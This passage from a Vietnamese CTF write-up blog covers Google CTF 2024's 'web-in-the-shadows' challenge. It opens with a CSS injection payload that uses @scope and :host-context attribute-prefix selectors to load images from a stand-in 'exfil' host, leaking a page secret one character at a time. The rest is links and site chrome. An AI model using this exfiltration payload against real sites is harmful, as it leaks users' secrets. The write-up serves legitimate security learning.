</span></span><span class="line"><span class="cl"><span class="p">@</span><span class="k">scope</span><span class="o">(</span><span class="p">:</span><span class="nd">host-context</span><span class="o">(</span><span class="nt">body</span><span class="o">[</span><span class="nt">secret</span><span class="o">^=</span><span class="s2">&#34;0&#34;</span><span class="o">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="nc">exfil0</span> <span class="p">{</span> <span class="k">display</span><span class="p">:</span> <span class="kc">block</span> <span class="cp">!important</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">@</span><span class="k">scope</span><span class="o">(</span><span class="p">:</span><span class="nd">host-context</span><span class="o">(</span><span class="nt">body</span><span class="o">[</span><span class="nt">secret</span><span class="o">^=</span><span class="s2">&#34;1&#34;</span><span class="o">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="nc">exfil1</span> <span class="p">{</span> <span class="k">display</span><span class="p">:</span> <span class="kc">block</span> <span class="cp">!important</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">@</span><span class="k">scope</span><span class="o">(</span><span class="p">:</span><span class="nd">host-context</span><span class="o">(</span><span class="nt">body</span><span class="o">[</span><span class="nt">secret</span><span class="o">^=</span><span class="s2">&#34;00&#34;</span><span class="o">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="nc">exfil00</span> <span class="p">{</span> <span class="k">display</span><span class="p">:</span> <span class="kc">block</span> <span class="cp">!important</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://exfil/0.jpg&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;hide exfil0&#34;</span> <span class="na">loading</span><span class="o">=</span><span class="s">&#34;lazy&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://exfil/1.jpg&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;hide exfil1&#34;</span> <span class="na">loading</span><span class="o">=</span><span class="s">&#34;lazy&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://exfil/00.jpg&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;hide exfil00&#34;</span> <span class="na">loading</span><span class="o">=</span><span class="s">&#34;lazy&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div>

<h3 class="relative group">Intended - Chromium bug 
    <div id="intended---chromium-bug" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#intended---chromium-bug" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Phần này chắc mình sẽ reference đến writeup của tác giả do <del>mình lười</del> nó cũng đã khá đầy đủ: <a href="https://github.com/google/google-ctf/tree/main/2024/quals/web-in-the-shadows" target="_blank">https://github.com/google/google-ctf/tree/main/2024/quals/web-in-the-shadows</a></p>

          
          
          
        </div>
        
        

        
        

        


<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
  
  

  <a href="/posts/cr3-2024/" class="min-w-full">
    
    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
        
        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/cr3-2024/featurecr3.png);"></div>
        
      

      <div class="px-6 py-4">

        
        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
          href="/posts/cr3-2024/">CR3 CTF 2024</div>
        

        <div class="text-sm text-neutral-500 dark:text-neutral-400">
          











  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-05-03T00:00:00&#43;00:00">3 May 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">15 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/reverse/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Reverse
  </span>
</span>
  </span>
  
  
  
  
</div>




        </div>

        
      </div>
      <div class="px-6 pt-4 pb-2">

      </div>
    </div>
  </a>

  
  

  <a href="/posts/imaginaryctf-2024/" class="min-w-full">
    
    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
        
        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/imaginaryctf-2024/feature-i.png);"></div>
        
      

      <div class="px-6 py-4">

        
        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
          href="/posts/imaginaryctf-2024/">ImaginaryCTF 2024</div>
        

        <div class="text-sm text-neutral-500 dark:text-neutral-400">
          











  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-04-27T00:00:00&#43;00:00">27 April 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/misc/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Misc
  </span>
</span>
  </span>
  
  
  
  
</div>




        </div>

        
      </div>
      <div class="px-6 pt-4 pb-2">

      </div>
    </div>
  </a>

  
  

  <a href="/posts/airflow-research/" class="min-w-full">
    
    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
        
        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/airflow-research/featureairflow.png);"></div>
        
      

      <div class="px-6 py-4">

        
        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
          href="/posts/airflow-research/">Apache Airflow not so Remote Code Execution</div>
        

        <div class="text-sm text-neutral-500 dark:text-neutral-400">
          











  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-05-20T00:00:00&#43;00:00">20 May 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/research/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Research
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  
  
  
</div>




        </div>

        
      </div>
      <div class="px-6 pt-4 pb-2">

      </div>
    </div>
  </a>

  
</section>

  
      </div>
     
      
      
        
        
          
          
        
      <script>
        var oid = "views_posts\/googlectf\/index.md"
        var oid_likes = "likes_posts\/googlectf\/index.md"
      </script>
      
      
      <script type="text/javascript" src="/js/page.min.4c1d8e0f53a5b5b7bccae87750581a0a393723aae9a9ae5622497d488b9689a4fd64a34846876e449a065aed64df10f9219b8df359a87371b998dd8bf58a1da5.js" integrity="sha512-TB2OD1Oltbe8yuh3UFgaCjk3I6rpqa5WIkl9SIuWiaT9ZKNIRoduRJoGWu1k3xD5IZuN81moc3G5mN2L9YodpQ=="></script>
      
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/airflow-research/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Apache Airflow not so Remote Code Execution</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-05-20T00:00:00&#43;00:00">20 May 2024</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/corctf24/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >CoR CTF 2024</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-07-29T00:00:00&#43;00:00">29 July 2024</time>
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
      <ul class="flex flex-col list-none sm:flex-row">
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/tags/"
            title="Tags">
            
            tags
          </a>
        </li>
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/categories/"
            title="Categories">
            
            categories
          </a>
        </li>
        
      </ul>
    </nav>
    
  
  <div class="flex items-center justify-between">

    
    
    <p class="text-sm text-neutral-500 dark:text-neutral-400">
      Copyright © Shin24
    </p>
    

    
    
    <p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
    </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="/js/process.min.330c9c7ed3478d29ddc83242e05f3636088799f250f724e0eee3b88057e4e288861cf148972d2ac1ed5972c27193c1c919d768bf5e52f6ef01d3abc3b16df7c2.js" integrity="sha512-MwycftNHjSndyDJC4F82NgiHmfJQ9yTg7uO4gFfk4oiGHPFIly0qwe1ZcsJxk8HJGddov15S9u8B06vDsW33wg=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="//localhost:1313/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
</body>

</html>
